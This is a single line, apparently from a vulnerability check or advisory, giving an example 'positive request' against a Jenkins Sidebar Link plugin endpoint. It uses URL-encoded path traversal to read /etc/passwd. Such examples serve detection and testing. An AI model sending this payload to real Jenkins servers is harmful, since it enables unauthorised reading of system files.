Example of a positive request: http://localhost:8080/jenkins/job/test/descriptorByName/hudson.plugins.sidebar_link.SidebarLinkPlugin/checkLinkIcon?value=..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
